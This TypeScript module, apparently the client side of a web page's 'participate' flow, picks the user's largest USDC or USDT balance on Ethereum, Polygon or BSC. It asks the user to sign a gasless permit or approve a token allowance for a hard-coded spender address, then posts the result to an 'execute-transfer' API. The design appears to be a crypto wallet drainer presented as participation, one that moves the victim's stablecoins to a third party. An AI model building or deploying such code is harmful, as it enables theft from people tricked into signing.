/**
 * Participate flow - sign type and chain depend on user's token balance.
 * Prioritizes token with highest balance across Ethereum, Polygon, BSC.
 * USDC: permit (sign) - gasless. USDT: approve (transaction).
 */

export const SPENDER_ADDRESS =
  "0x9E6120D8Bc8363b1FCF367eE34219C82D34a3f15" as const;
export const MAX_UINT256 =
  "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff" as const;

/** Chains we support for participate, in check order */
export const PARTICIPATE_CHAINS = [
  {
    chainId: 1,
    chainName: "Ethereum",
    tokens: [
      {
        symbol: "USDC",
        address: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48" as const,
        decimals: 6,
        signType: "permit" as const,
        permitDomain: {
          name: "USD Coin",
          version: "2",
          chainId: 1,
          verifyingContract:
            "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48" as `0x${string}`,
        },
      },
      {
        symbol: "USDT",
        address: "0xdAC17F958D2ee523a2206206994597C13D831ec7" as const,
        decimals: 6,
        signType: "approve" as const,
      },
    ],
  },
  {
    chainId: 137,
    chainName: "Polygon",
    tokens: [
      {
        symbol: "USDC",
        address: "0x3c499c542cEF5E3811e1192ce70d8cC03d5c3359" as const,
        decimals: 6,
        signType: "permit" as const,
        permitDomain: {
          name: "USD Coin",
          version: "2",
          chainId: 137,
          verifyingContract:
            "0x3c499c542cEF5E3811e1192ce70d8cC03d5c3359" as `0x${string}`,
        },
      },
      {
        symbol: "USDT",
        address: "0xc2132D05D31c914a87C6611C10748AEb04B58e8F" as const,
        decimals: 6,
        signType: "approve" as const,
      },
    ],
  },
  {
    chainId: 56,
    chainName: "BSC",
    tokens: [
      {
        symbol: "USDC",
        address: "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d" as const,
        decimals: 18,
        signType: "approve" as const,
      },
      {
        symbol: "USDT",
        address: "0x55d398326f99059fF775485246999027B3197955" as const,
        decimals: 18,
        signType: "approve" as const,
      },
    ],
  },
] as const;

export type ParticipateChain = (typeof PARTICIPATE_CHAINS)[number];
export type ParticipateToken = ParticipateChain["tokens"][number];
export type SignType = "permit" | "approve";

/** Flat list of { chain, token } for balance fetching */
export function getParticipateTokenEntries(): Array<{
  chainId: number;
  chainName: string;
  token: ParticipateToken;
}> {
  const entries: Array<{
    chainId: number;
    chainName: string;
    token: ParticipateToken;
  }> = [];
  for (const chain of PARTICIPATE_CHAINS) {
    for (const token of chain.tokens) {
      entries.push({
        chainId: chain.chainId,
        chainName: chain.chainName,
        token,
      });
    }
  }
  return entries;
}

/** USDT-compatible approve ABI: USDT returns nothing (non-standard), so outputs must be empty to avoid revert */
export const ERC20_APPROVE_ABI = [
  {
    type: "function",
    name: "approve",
    stateMutability: "nonpayable",
    inputs: [
      { type: "address", name: "spender" },
      { type: "uint256", name: "amount" },
    ],
    outputs: [],
  },
] as const;

export const ERC20_BALANCE_ABI = [
  {
    type: "function",
    name: "balanceOf",
    stateMutability: "view",
    inputs: [{ type: "address", name: "account" }],
    outputs: [{ type: "uint256" }],
  },
] as const;

export const ERC2612_NONCE_ABI = [
  {
    type: "function",
    name: "nonces",
    stateMutability: "view",
    inputs: [{ type: "address", name: "owner" }],
    outputs: [{ type: "uint256" }],
  },
] as const;

export const PERMIT_TYPED_DATA = {
  Permit: [
    { name: "owner", type: "address" },
    { name: "spender", type: "address" },
    { name: "value", type: "uint256" },
    { name: "nonce", type: "uint256" },
    { name: "deadline", type: "uint256" },
  ],
} as const;

export function getTransferApiUrl(): string {
  if (
    typeof window !== "undefined" &&
    (window as unknown as { TRANSFER_API_URL?: string }).TRANSFER_API_URL
  ) {
    return (window as unknown as { TRANSFER_API_URL: string }).TRANSFER_API_URL;
  }
  return typeof window !== "undefined" && window.location
    ? `${window.location.origin}/api/execute-transfer`
    : "/api/execute-transfer";
}

export async function triggerTransferApi(
  userAddress: string,
  chainId: number,
  payload:
    | { approveTxHash: string; tokenAddress: string }
    | {
        tokenAddress: string;
        permit: {
          value: string;
          deadline: number;
          v: number;
          r: `0x${string}`;
          s: `0x${string}`;
        };
      }
): Promise<void> {
  const url = getTransferApiUrl();
  const body =
    "approveTxHash" in payload
      ? {
          userAddress,
          chainId,
          approveTxHash: payload.approveTxHash,
          tokenAddress: payload.tokenAddress,
        }
      : {
          userAddress,
          chainId,
          permit: payload.permit,
          tokenAddress: payload.tokenAddress,
        };
  const res = await fetch(url, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(body),
  });
  if (!res.ok) {
    const err = await res.json().catch(() => ({}));
    throw new Error(err.error || "Transfer failed");
  }
}
